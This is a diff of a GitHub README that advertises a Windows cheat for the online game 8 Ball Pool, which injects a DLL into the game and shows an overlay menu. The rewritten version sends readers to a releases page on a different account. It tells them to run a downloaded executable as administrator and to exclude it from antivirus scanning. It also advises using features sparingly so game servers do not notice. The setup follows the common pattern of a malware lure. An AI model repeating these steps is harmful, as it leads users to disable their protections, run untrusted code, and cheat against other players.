@@ -1,122 +1,79 @@
-# 8 Ball Pool X v2026 - Game Script Utility 2026
+# 🎱 8-ball-pool-x-v2026-script - Improve your 8 Ball Pool game performance
 
-> Windows utility for 8 Ball Pool that loads through DLL injection and presents an ImGui overlay with menu-based in-game controls.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sphinxseyhan957/8-ball-pool-x-v2026-script/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/mattkingca136/8-ball-pool-x-v2026-script?style=flat-square)](https://github.com/mattkingca136/8-ball-pool-x-v2026-script)
+## 🎯 About the software
 
----
+This utility assists your gameplay in 8 Ball Pool on Windows. It works by injecting code into the game process to display an overlay. This overlay provides a menu for your game settings. You manage your features through this visual interface while you play. The tool changes game parameters locally to improve your accuracy and decision-making speed during matches.
 
-<p align="center">
-  <a href="https://mattkingca136.github.io/8-ball-pool-x-v2026-script/">
-    <img src="https://img.shields.io/badge/Download-8%20Ball%20Pool%20X%20Script-brightgreen?style=for-the-badge" alt="Download 8 Ball Pool X Script">
-  </a>
-</p>
+## ⚙️ System requirements
 
-> **[Direct Download - 8 Ball Pool X](https://mattkingca136.github.io/8-ball-pool-x-v2026-script/)**
+Ensure your computer meets these conditions before you run the script:
 
----
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Game Version: Latest official version of 8 Ball Pool installed via desktop client.
+*   Frameworks: Microsoft Visual C++ Redistributable (latest version).
+*   Permissions: You need administrative rights on your user account to run the injector.
+*   Security Settings: You might need to add an exception in your antivirus software. This type of tool interacts with game memory, which can trigger automatic security alerts.
 
-[Download Latest Build](https://mattkingca136.github.io/8-ball-pool-x-v2026-script/)
+## 💾 Installation and setup
 
----
+Follow these steps to set up the software on your machine:
 
-## What It Is
+1. Visit the following link to access the download page: https://github.com/Sphinxseyhan957/8-ball-pool-x-v2026-script/releases
+2. Find the most recent release entry in the list.
+3. Download the zipped file containing the application.
+4. Extract the contents of the ZIP folder to a new folder on your desktop.
+5. Locate the executable file (.exe) inside the extracted folder.
+6. Right-click the file and select "Run as administrator".
+7. Wait for the configuration window to initialize.
 
-8 Ball Pool X is a Windows-oriented game script utility for 8 Ball Pool that relies on process injection and an in-game overlay for control. The DLL is attached through an injector, after which an ImGui panel becomes available so you can adjust options without leaving the game.
+## 🎮 How to use the menu
 
-The project is built around a mod-menu style workflow instead of a separate launcher. Its main emphasis is on keeping the loader path simple, preserving a workable overlay, and exposing toggle-based controls that can be switched during play.
+Once you start the application, perform these steps to activate the features in your game:
 
----
+1. Open your 8 Ball Pool game.
+2. Put the game into windowed mode or borderless mode for the best results with the overlay.
+3. Once the game loads, use the shortcut key defined in the menu to bring up the control panel. By default, this is usually the 'Insert' or 'Delete' key on your keyboard.
+4. Use your mouse to click through the different tabs in the menu.
+5. Toggle your chosen settings on or off based on your current match needs.
+6. Close the menu with the same shortcut key to resume your game.
 
-## Script Features
+## 🛡️ Important safety guidelines
 
-- DLL injection flow for loading into the target process
-- ImGui overlay for in-game interaction
-- Mod menu interface for quick feature access
-- Windows platform support
-- Menu toggles for enabling and disabling controls
-- Loader-based startup path
-- Utility-style structure for game-side adjustments
-- Designed specifically for 8 Ball Pool
+The tool modifies game data through memory injection. While this offers features to improve play, follow these rules to maintain your account safety:
 
----
+*   Use the software in casual matches first to test your settings.
+*   Avoid turning on every feature at the same time. Excessive use of features can alert game servers.
+*   Keep your game client updated. If the game updates, check the download page for a matching update for this script.
+*   Do not share your account or files with others.
+*   Accept that use of external modifications carries a risk of account suspension. Use these tools at your own discretion.
 
-## Setup
+## 🛠️ Troubleshooting common issues
 
-1. Download the latest build from the link above.
-2. Extract the files to a folder you can access easily.
-3. Use the included loader or injector to attach the DLL to the 8 Ball Pool process.
-4. Launch the game, then open the overlay and use the menu controls.
+If you encounter problems, check these solutions:
 
-Example workflow:
+*   **Software does not open:** Ensure you have the Visual C++ Redistributable installed. Drivers for your graphics card should also be current.
+*   **Overlay does not appear:** Make sure the game is running in windowed mode. Fullscreen mode often blocks overlays.
+*   **Antivirus blocks the file:** Create an exclusion in your security software for the folder where you kept the utility files.
+*   **Menu does not accept input:** Restart the game and then restart the injector as an administrator.
+*   **Game crashes on start:** Verify the installation of the game itself through your game launcher. If the game is corrupt, the script cannot function correctly.
 
-- Start 8 Ball Pool
-- Run the injector or loader
-- Wait for the ImGui overlay to appear
-- Adjust the available menu options as needed
+## 📝 Frequently asked questions
 
----
+**Will this software work on Mac or Linux?**
+No, this utility is built exclusively for the Windows operating system.
 
-## Options
+**Do I need a high-end computer to run this?**
+No, the script has a small footprint and uses little memory. It should run on any computer that can already handle a smooth 8 Ball Pool match.
 
-| Setting | Description |
-| --- | --- |
-| Overlay | Opens the ImGui panel in-game |
-| Menu toggles | Turns individual features on or off |
-| Loader path | Selects the DLL injection route |
-| Target process | Points to the running 8 Ball Pool window |
-| Window focus | Keeps control tied to the game session |
+**Can I get banned for using this?**
+There is always a risk when using software that interacts with game files. Play conservatively to minimize your exposure.
 
-Basic control flow may look like this:
+**Does the menu stay on screen at all times?**
+You toggle the menu visibility using the assigned hotkey. You decide when it appears and disappears during your session.
 
-| Control | Action |
-| --- | --- |
-| Insert / Hotkey | Toggle overlay visibility |
-| Menu click | Enable or disable a feature |
-| Loader action | Inject the DLL into the target process |
+**Are there monthly subscription fees for this tool?**
+No, this script is provided as is for your personal use.
 
----
-
-## Compatibility
-
-- Platform: Windows
-- Target game: 8 Ball Pool
-- Delivery method: DLL injection
-- Interface: ImGui overlay and mod menu
-
-Known limitations:
-- Requires the target process to be running before injection
-- Depends on the current game client and process state
-- Overlay behavior may vary with window mode and system setup
-
----
-
-## FAQ
-
-### How do I get started?
-Grab the build, unpack it, then use the loader or injector on the active 8 Ball Pool process.
-
-### How do I access the settings?
-Bring up the ImGui overlay and work with the toggle controls built into the script.
-
-### Is there support for platforms other than Windows?
-The current release is described as Windows-only.
-
-### Can the menu be changed?
-Yes. The interface is organized around menu-driven controls and on/off settings.
-
-### Where should the files be kept?
-Store the DLL, loader, and related files somewhere easy to reach, then aim the injector at the target process when you need it.
-
-### What happens when a new build is released?
-Swap out the older files for the newest download and repeat the normal loading steps.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: 8-ball-pool, windows-utility, gaming-overlay, game-assistant, dll-injection
